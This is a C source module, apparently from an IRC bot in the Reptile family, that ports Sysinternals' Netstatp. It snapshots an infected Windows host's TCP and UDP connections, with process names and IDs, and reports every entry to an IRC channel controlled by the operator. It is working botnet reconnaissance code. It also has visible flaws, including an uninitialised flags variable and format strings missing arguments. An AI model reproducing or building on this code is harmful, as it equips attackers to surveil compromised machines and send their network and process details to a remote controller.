//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//


/*
	Original Netstatp code by: Mark Russinovich from: www.sysinternals.com <3
	Ported to Reptile by someone you probably don't know.
*/
#include "includes.h"
#include "functions.h"

#ifndef NO_NETSTATP


// Possible TCP endpoint states
static char TcpState[][32] = {"???","CLOSED","LISTENING","SYN_SENT","SYN_RCVD","ESTABLISHED","FIN_WAIT1","FIN_WAIT2","CLOSE_WAIT","CLOSING","LAST_ACK","TIME_WAIT","DELETE_TCB"};

//------------------------------------------------------------
// GetPortName
//
// Translate port numbers into their text equivalent if 
// there is one
//------------------------------------------------------------
PCHAR GetPortName(DWORD Flags,UINT port,PCHAR proto,PCHAR name,int namelen) {
	struct servent *psrvent;

	if(Flags & FLAG_SHOW_NUMBERS) {
		sprintf(name, "%d", fhtons((WORD)port));
		return name;
	} 

	// Try to translate to a name
	if(psrvent = fgetservbyport(port,proto)) {
		strcpy(name,psrvent->s_name);
	} else {
		sprintf(name,"%d",fhtons((WORD)port));
	}

	return name;
}

//------------------------------------------------------------
// GetIpHostName
//
// Translate IP addresses into their name-resolved form
// if possible.
//------------------------------------------------------------
PCHAR GetIpHostName(DWORD Flags,BOOL local,UINT ipaddr,PCHAR name,int namelen) {
	struct hostent	*phostent;
	UINT			nipaddr;

	// Does the user want raw numbers?
	nipaddr = fhtonl(ipaddr);
	if(Flags & FLAG_SHOW_NUMBERS) {
		sprintf(name, "%d.%d.%d.%d",(nipaddr >> 24) & 0xFF,(nipaddr >> 16) & 0xFF,(nipaddr >> 8) & 0xFF,(nipaddr) & 0xFF);
		return name;
	}

	// Try to translate to a name
	if(!ipaddr) {
		if(!local) {
			sprintf(name,"%d.%d.%d.%d",(nipaddr >> 24) & 0xFF,(nipaddr >> 16) & 0xFF,(nipaddr >> 8) & 0xFF,(nipaddr) & 0xFF);
		} else {
			fgethostname(name, namelen);
		}
	} else if( ipaddr == 0x0100007f ) {
		if(local) {
			fgethostname(name, namelen);
		} else {
			strcpy(name,"localhost");
		}
	} else if(phostent = fgethostbyaddr((char *)&ipaddr,sizeof(nipaddr),PF_INET)) {
		strcpy(name, phostent->h_name);
	} else {
		sprintf(name,"%d.%d.%d.%d",(nipaddr >> 24) & 0xFF,(nipaddr >> 16) & 0xFF,(nipaddr >> 8) & 0xFF,(nipaddr) & 0xFF);
	}

	return name;
}

DWORD WINAPI NetstatpThread(LPVOID param) 
{
//	int entries = LOGSIZE, tmp = 0;

	NTHREAD netstat = *((NTHREAD *)param);
	NTHREAD *netstatp = (NTHREAD *)param;
	netstatp->gotinfo = TRUE;
	IRC* irc=(IRC*)netstat.conn;

	if (!nokernel32) {
		if (!noiphlpapi) {
			
			DWORD error,dwSize;
			PMIB_TCPEXTABLE tcpExTable;
			PMIB_UDPEXTABLE udpExTable;
			PMIB_TCPTABLE tcpTable;
			PMIB_UDPTABLE udpTable;
			DWORD i, flags;
			CHAR  processName[MAX_PATH];
			CHAR  localname[HOSTNAMELEN], remotename[HOSTNAMELEN];
			CHAR  remoteport[PORTNAMELEN], localport[PORTNAMELEN];
			CHAR  localaddr[ADDRESSLEN], remoteaddr[ADDRESSLEN];

			if (netstat.bdata1)//all
				flags |= FLAG_ALL_ENDPOINTS;

			if (netstat.bdata2)//dont resolve
				flags |= FLAG_SHOW_NUMBERS;

			// Check for NT
			if(GetVersion() >= 0x80000000) {
				irc->privmsg(netstat.target,"%s Netstatp requres Windows NT/2K/XP.",netstatp_title);
				clearthread(netstat.threadnum);
				ExitThread(0);
			}

			if (!noiphlpapinsp) // xp+
			{

				// Get the tables of TCP and UDP endpoints with process IDs
				error=fAllocateAndGetTcpExTableFromStack(&tcpExTable,TRUE,GetProcessHeap(),2,2);
				if(error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot TCP endpoints, error: <%d>.", GetLastError());
					clearthread(netstat.threadnum);
					ExitThread(0);
				}
				error=fAllocateAndGetUdpExTableFromStack(&udpExTable,TRUE,GetProcessHeap(),2,2);
				if(error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot UDP endpoints, error: <%d>.", GetLastError());
					clearthread(netstat.threadnum);
					ExitThread(0);
				}

				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Displaying %sconnections:%s", netstatp_title,(netstat.bdata1?"all ":""),(netstat.bdata2?" (Not Resolving)":""));
				
				// Dump the TCP table
				for (i=0; i<tcpExTable->dwNumEntries; i++ ) {
					if(flags & FLAG_ALL_ENDPOINTS || tcpExTable->table[i].dwState == MIB_TCP_STATE_ESTAB) {

						if (netstat.idata1 == 0 || netstat.idata1 == atoi(GetPortName(FLAG_SHOW_NUMBERS,tcpExTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN))) {
							sprintf(localaddr,"%s:%s", 
								GetIpHostName(flags,TRUE,tcpExTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
								GetPortName(flags,tcpExTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

							sprintf(remoteaddr,"%s:%s",
								GetIpHostName(flags,FALSE,tcpExTable->table[i].dwRemoteAddr,remotename,HOSTNAMELEN),
									tcpExTable->table[i].dwRemoteAddr?
									GetPortName(flags,tcpExTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN):
									"0");

							irc->privmsg(netstat.target,"%s %-11s - %s:%d - Local: %s - Remote: %s.",
								tcp_title, TcpState[tcpExTable->table[i].dwState],
								ProcessPidToName(tcpExTable->table[i].dwProcessId,processName),
								tcpExTable->table[i].dwProcessId,
								localaddr,remoteaddr);
						}
					}
				}

				// Dump the UDP table
				if (flags & FLAG_ALL_ENDPOINTS) {
					for (i=0; i<udpExTable->dwNumEntries; i++) {

						sprintf(localaddr,"%s:%s", 
							GetIpHostName(flags,TRUE,udpExTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
							GetPortName(flags,udpExTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

						irc->privmsg(netstat.target,"%s %s:%d - Local: %s - Remote: %s",udp_title, 
							ProcessPidToName(udpExTable->table[i].dwProcessId,processName),udpExTable->table[i].dwProcessId,
							localaddr,"*.*.*.*:*");
					}
				}
				
				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Finished displaying connections.", netstatp_title);
			
			}
			else//if noiphlpapinsp
			{	//nt-2k?

				// Get the table of TCP endpoints
				dwSize = 0;
				error=fGetTcpTable(NULL,&dwSize,TRUE);
				if (error != ERROR_INSUFFICIENT_BUFFER) {
					irc->privmsg(netstat.target,"%s Failed to snapshot TCP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}
				tcpTable = (PMIB_TCPTABLE)malloc(dwSize);
				error=fGetTcpTable(tcpTable,&dwSize,TRUE);
				if (error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot TCP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}

				// Get the table of UDP endpoints
				dwSize=0;
				error=fGetUdpTable(NULL,&dwSize,TRUE);
				if (error != ERROR_INSUFFICIENT_BUFFER) {
					irc->privmsg(netstat.target,"%s Failed to snapshot UDP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}
				udpTable=(PMIB_UDPTABLE)malloc(dwSize);
				error=fGetUdpTable(udpTable,&dwSize,TRUE);
				if (error) {
					irc->privmsg(netstat.target,"%s Failed to snapshot UDP endpoints, error: <%d>",error);
					clearthread(netstat.threadnum);
					ExitThread(0);
				}

				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Displaying %sconnections:%s", netstatp_title,(netstat.bdata1?"all ":""),(netstat.bdata2?" (Not Resolving)":""));
				
				// Dump the TCP table
				for (i=0; i<tcpTable->dwNumEntries; i++ ) {
					if(flags & FLAG_ALL_ENDPOINTS || tcpTable->table[i].dwState==MIB_TCP_STATE_ESTAB) {

						if (netstat.idata1 == 0 || netstat.idata1 == atoi(GetPortName(FLAG_SHOW_NUMBERS,tcpTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN))) {
							sprintf(localaddr,"%s:%s", 
								GetIpHostName(flags,TRUE,tcpTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
								GetPortName(flags,tcpTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

							sprintf(remoteaddr,"%s:%s",
								GetIpHostName(flags,FALSE,tcpTable->table[i].dwRemoteAddr,remotename,HOSTNAMELEN),
								tcpTable->table[i].dwRemoteAddr?GetPortName(flags,tcpTable->table[i].dwRemotePort,"tcp",remoteport,PORTNAMELEN):"0");

							irc->privmsg(netstat.target,"%s %-11s - Local: %s - Remote: %s.",
								tcp_title, TcpState[tcpTable->table[i].dwState],
								localaddr,remoteaddr);
						}
					}
				}

				// Dump the UDP table
				if (flags & FLAG_ALL_ENDPOINTS) {
					for (i=0; i<udpTable->dwNumEntries; i++) {

						sprintf(localaddr,"%s:%s", 
							GetIpHostName(flags,TRUE,udpTable->table[i].dwLocalAddr,localname,HOSTNAMELEN), 
							GetPortName(flags,udpTable->table[i].dwLocalPort,"tcp",localport,PORTNAMELEN));

						irc->privmsg(netstat.target,"%s Local: %s - Remote: %s",
							udp_title, localaddr,"*.*.*.*:*");
					}
				}
				
				if (!netstat.bdata3)
					irc->privmsg(netstat.target,"%s Finished displaying connections.", netstatp_title);
			}
		}
	}
	clearthread(netstat.threadnum);
	ExitThread(0);
}

#endif